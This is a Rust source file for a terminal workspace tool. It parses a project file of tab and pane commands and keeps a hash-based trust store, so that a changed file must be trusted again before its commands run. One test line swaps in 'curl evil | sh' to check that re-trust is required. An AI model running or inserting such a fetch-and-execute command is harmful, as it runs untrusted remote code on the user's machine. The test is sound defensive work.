//! Project file `<root>/.nox/workspace.toml` (SPEC 4.7, 11) and its trust store
//! `~/.nox/trusted.toml`.
//!
//! Trust is keyed by the project file's path and the SHA-256 of its content: any change to the
//! file asks again (like `direnv`).

use std::collections::BTreeMap;
use std::io::Write;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::Result;

/// Path of the project file relative to the workspace root.
pub const PROJECT_FILE: &str = ".nox/workspace.toml";

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ProjectLayout {
    /// Panes side by side.
    Vertical,
    /// Panes stacked.
    Horizontal,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct ProjectPane {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<String>,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct ProjectTab {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub title: Option<String>,
    /// The command of a single-pane tab (ignored when `panes` is set).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub layout: Option<ProjectLayout>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub panes: Vec<ProjectPane>,
}

impl ProjectTab {
    /// The commands of the tab's panes, in order (`None`: a plain shell). A tab without `panes`
    /// is one pane running `command`.
    pub fn pane_commands(&self) -> Vec<Option<&str>> {
        if self.panes.is_empty() {
            vec![self.command.as_deref()]
        } else {
            self.panes.iter().map(|p| p.command.as_deref()).collect()
        }
    }
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct ProjectFile {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub name: Option<String>,
    /// One of the theme's ANSI color names.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub color: Option<String>,
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub env: BTreeMap<String, String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub tabs: Vec<ProjectTab>,
}

/// SHA-256 hex of file content.
pub fn content_hash(content: &[u8]) -> String {
    hex::encode(Sha256::digest(content))
}

impl ProjectFile {
    pub fn parse(content: &str) -> Result<Self> {
        Ok(toml::from_str(content)?)
    }

    /// `<root>/.nox/workspace.toml` (see [`PROJECT_FILE`]).
    pub fn path(root: &Path) -> PathBuf {
        root.join(PROJECT_FILE)
    }

    /// Loads the project file of `root` with the SHA-256 hex of its content; `Ok(None)` when
    /// there is none.
    pub fn load(root: &Path) -> Result<Option<(ProjectFile, String)>> {
        let bytes = match std::fs::read(Self::path(root)) {
            Ok(b) => b,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
            Err(e) => return Err(e.into()),
        };
        let text = String::from_utf8(bytes)
            .map_err(|_| crate::Error::Invalid(format!("{} is not UTF-8", Self::path(root).display())))?;
        let file = Self::parse(&text)?;
        Ok(Some((file, content_hash(text.as_bytes()))))
    }

    /// Every command the file would run, in tab / pane order — what the trust sheet lists.
    pub fn commands(&self) -> Vec<String> {
        self.tabs
            .iter()
            .flat_map(|t| t.pane_commands())
            .flatten()
            .map(str::trim)
            .filter(|c| !c.is_empty())
            .map(str::to_string)
            .collect()
    }

    /// Does the file need trust before it runs anything?
    pub fn has_commands(&self) -> bool {
        !self.commands().is_empty()
    }
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
struct TrustFile {
    #[serde(default)]
    trusted: BTreeMap<String, String>,
}

/// `~/.nox/trusted.toml`: `[trusted]` project file path → content hash.
#[derive(Debug, Clone)]
pub struct TrustStore {
    path: PathBuf,
    entries: BTreeMap<String, String>,
}

fn key(path: &Path) -> String {
    path.to_string_lossy().into_owned()
}

impl TrustStore {
    /// Loads the store at `path` (missing → empty).
    pub fn load(path: &Path) -> Result<Self> {
        let entries = match std::fs::read_to_string(path) {
            Ok(s) => toml::from_str::<TrustFile>(&s)?.trusted,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => BTreeMap::new(),
            Err(e) => return Err(e.into()),
        };
        Ok(Self { path: path.to_path_buf(), entries })
    }

    /// Is the project file at `path` trusted with exactly this content `hash`?
    pub fn is_trusted(&self, path: &Path, hash: &str) -> bool {
        self.entries.get(&key(path)).is_some_and(|h| h == hash)
    }

    /// Trusts `path` at `hash` (replacing an older hash) and saves atomically.
    pub fn trust(&mut self, path: &Path, hash: &str) -> Result<()> {
        self.entries.insert(key(path), hash.to_string());
        self.save()
    }

    /// Forgets `path` and saves.
    pub fn revoke(&mut self, path: &Path) -> Result<()> {
        if self.entries.remove(&key(path)).is_some() {
            self.save()?;
        }
        Ok(())
    }

    fn save(&self) -> Result<()> {
        let dir = self.path.parent().filter(|d| !d.as_os_str().is_empty()).unwrap_or(Path::new("."));
        std::fs::create_dir_all(dir)?;
        let body = toml::to_string(&TrustFile { trusted: self.entries.clone() })?;
        let mut tmp = tempfile::NamedTempFile::new_in(dir)?;
        tmp.write_all(
            b"# Project files (.nox/workspace.toml) trusted to run commands: path = sha256 of content.\n",
        )?;
        tmp.write_all(body.as_bytes())?;
        tmp.as_file().sync_all()?;
        tmp.persist(&self.path).map_err(|e| e.error)?;
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const SAMPLE: &str = r#"
name = "nox"
color = "cyan"               # one of the theme's ANSI color names

[env]
RUST_LOG = "debug"

[[tabs]]
title = "agent"
command = "claude"

[[tabs]]
title = "dev"
layout = "vertical"          # two panes side by side
panes = [{ command = "cargo watch -x check" }, { command = "git log --oneline -20" }]

[[tabs]]
title = "shell"
"#;

    #[test]
    fn parses_the_spec_example() {
        let p = ProjectFile::parse(SAMPLE).unwrap();
        assert_eq!(p.name.as_deref(), Some("nox"));
        assert_eq!(p.color.as_deref(), Some("cyan"));
        assert_eq!(p.env["RUST_LOG"], "debug");
        assert_eq!(p.tabs.len(), 3);
        assert_eq!(p.tabs[1].layout, Some(ProjectLayout::Vertical));
        assert_eq!(
            p.tabs[1].pane_commands(),
            vec![Some("cargo watch -x check"), Some("git log --oneline -20")]
        );
        assert_eq!(p.tabs[2].pane_commands(), vec![None]);
        assert_eq!(p.commands(), ["claude", "cargo watch -x check", "git log --oneline -20"]);
        assert!(ProjectFile::parse("layout = 3\n[[tabs]]\nlayout = \"diagonal\"").is_err());
        assert!(!ProjectFile::parse("name = \"x\"").unwrap().has_commands());
    }

    #[test]
    fn load_and_trust_reasks_on_change() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().join("proj");
        std::fs::create_dir_all(&root).unwrap();
        assert!(ProjectFile::load(&root).unwrap().is_none());
        std::fs::create_dir_all(root.join(".nox")).unwrap();
        let file = ProjectFile::path(&root);
        std::fs::write(&file, SAMPLE).unwrap();
        let (p, hash) = ProjectFile::load(&root).unwrap().unwrap();
        assert_eq!(p.tabs.len(), 3);
        assert_eq!(hash.len(), 64);
        assert_eq!(hash, content_hash(SAMPLE.as_bytes()));

        let store_path = tmp.path().join("home/.nox/trusted.toml");
        let mut store = TrustStore::load(&store_path).unwrap();
        assert!(!store.is_trusted(&file, &hash));
        store.trust(&file, &hash).unwrap();
        assert!(store.is_trusted(&file, &hash));
        // Persisted.
        let store = TrustStore::load(&store_path).unwrap();
        assert!(store.is_trusted(&file, &hash));

        // Any change asks again.
        std::fs::write(&file, SAMPLE.replace("claude", "curl evil | sh")).unwrap();
        let (_, hash2) = ProjectFile::load(&root).unwrap().unwrap();
        assert_ne!(hash, hash2);
        let mut store = TrustStore::load(&store_path).unwrap();
        assert!(!store.is_trusted(&file, &hash2));
        store.trust(&file, &hash2).unwrap();
        assert!(!store.is_trusted(&file, &hash), "the old hash is replaced");
        store.revoke(&file).unwrap();
        assert!(!TrustStore::load(&store_path).unwrap().is_trusted(&file, &hash2));

        std::fs::write(&file, "tabs = 5").unwrap();
        assert!(ProjectFile::load(&root).is_err());
    }
}
